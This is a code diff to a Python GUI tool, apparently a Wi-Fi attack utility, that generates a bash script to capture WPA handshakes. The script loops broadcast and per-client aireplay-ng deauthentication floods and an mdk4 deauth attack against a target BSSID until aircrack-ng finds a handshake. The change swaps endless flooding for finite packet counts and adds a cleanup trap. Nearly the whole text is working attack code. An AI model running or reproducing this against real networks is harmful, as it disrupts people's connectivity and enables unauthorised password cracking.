@@ -1361,45 +1361,49 @@ class MaximWindow(QMainWindow):
         script.write("AIRODUMP_PID=$!\n")
         script.write("sleep 2\n\n")
 
-        # Deauth — clean, quiet, maximum aggression
-        script.write("echo 'Executing Deauth...'\n")
-        script.write("while true; do\n")
-        # aireplay-ng broadcast — 0 = continuous flood
-        script.write(f"  sudo aireplay-ng --deauth 0 -a $BSSID {iface} &>/dev/null &\n")
-        script.write("  DEAUTH_MAIN=$!\n")
-        # Per-client targeted deauth in parallel
-        script.write(f"  CAP_CSV=$(ls -t \"$CAPTURE_DIR/{safe_essid}\"-*.csv 2>/dev/null | head -1)\n")
-        script.write("  if [ -n \"$CAP_CSV\" ]; then\n")
-        script.write("    for STA in $(grep -E '^[0-9A-Fa-f]{2}:' \"$CAP_CSV\" | grep -v \"^$BSSID\" | grep -i \"$BSSID\" | cut -d, -f1 | tr -d ' ' | sort -u); do\n")
-        script.write(f"      sudo aireplay-ng --deauth 0 -a $BSSID -c $STA {iface} &>/dev/null &\n")
-        script.write("    done\n")
-        script.write("  fi\n")
-        # mdk4 in parallel
-        script.write("  if command -v mdk4 >/dev/null 2>&1; then\n")
-        script.write("    echo $BSSID > /tmp/maxim_mdk_target\n")
-        script.write(f"    sudo mdk4 {iface} d -B /tmp/maxim_mdk_target -c $CHANNEL &>/dev/null &\n")
-        script.write("  fi\n")
-        # Let everything blast for 15 seconds
-        script.write("  sleep 15\n")
-        # Kill all deauth processes for this round
+        # Trap to guarantee ALL deauth processes die on exit/kill/ctrl+c
+        script.write("# Cleanup function — kills ALL deauth no matter how script exits\n")
+        script.write("cleanup() {\n")
+        script.write("  echo 'Stopping all deauth...'\n")
         script.write("  sudo pkill -f 'aireplay-ng' 2>/dev/null\n")
         script.write("  sudo pkill -f 'mdk4' 2>/dev/null\n")
         script.write("  sleep 1\n")
+        script.write("  # Double-kill in case they respawned\n")
+        script.write("  sudo pkill -9 -f 'aireplay-ng' 2>/dev/null\n")
+        script.write("  sudo pkill -9 -f 'mdk4' 2>/dev/null\n")
+        script.write("  kill $AIRODUMP_PID 2>/dev/null\n")
+        script.write("}\n")
+        script.write("trap cleanup EXIT INT TERM\n\n")
+
+        # Deauth — uses finite packet counts, NOT --deauth 0
+        # This way processes always finish and never run forever
+        script.write("echo 'Executing Deauth...'\n")
+        script.write("while true; do\n")
+        # Broadcast deauth — 500 packets then stops
+        script.write(f"  sudo aireplay-ng --deauth 500 -a $BSSID {iface} &>/dev/null &\n")
+        # Per-client targeted deauth
+        script.write(f"  CAP_CSV=$(ls -t \"$CAPTURE_DIR/{safe_essid}\"-*.csv 2>/dev/null | head -1)\n")
+        script.write("  if [ -n \"$CAP_CSV\" ]; then\n")
+        script.write("    for STA in $(grep -E '^[0-9A-Fa-f]{2}:' \"$CAP_CSV\" | grep -v \"^$BSSID\" | grep -i \"$BSSID\" | cut -d, -f1 | tr -d ' ' | sort -u); do\n")
+        script.write(f"      sudo aireplay-ng --deauth 200 -a $BSSID -c $STA {iface} &>/dev/null &\n")
+        script.write("    done\n")
+        script.write("  fi\n")
+        # mdk4 with timeout — always dies
+        script.write("  if command -v mdk4 >/dev/null 2>&1; then\n")
+        script.write("    echo $BSSID > /tmp/maxim_mdk_target\n")
+        script.write(f"    sudo timeout 10 mdk4 {iface} d -B /tmp/maxim_mdk_target -c $CHANNEL &>/dev/null &\n")
+        script.write("  fi\n")
+        # Wait for this round to finish (finite packets = they all end)
+        script.write("  wait\n")
         # Check for handshake
         script.write(f"  CAP_FILE=$(ls -t \"$CAPTURE_DIR/{safe_essid}\"-*.cap 2>/dev/null | head -1)\n")
         script.write("  if [ -n \"$CAP_FILE\" ]; then\n")
-        script.write("    # Verify handshake exists AND matches our target BSSID\n")
         script.write("    if aircrack-ng \"$CAP_FILE\" 2>&1 | grep -i \"$BSSID\" | grep -qE '[1-9][0-9]* handshake'; then\n")
         script.write("      echo 'HANDSHAKE CAPTURED!'\n")
         script.write("      break\n")
         script.write("    fi\n")
         script.write("  fi\n")
         script.write("done\n\n")
-
-        # Cleanup
-        script.write("kill $AIRODUMP_PID 2>/dev/null; wait $AIRODUMP_PID 2>/dev/null\n")
-        script.write("sudo pkill -f 'aireplay-ng' 2>/dev/null\n")
-        script.write("sudo pkill -f 'mdk4' 2>/dev/null\n")
         # Restore attack adapter to managed mode
         script.write(f"\n# ═══ CLEANUP: restore {iface} to managed mode ═══\n")
         script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
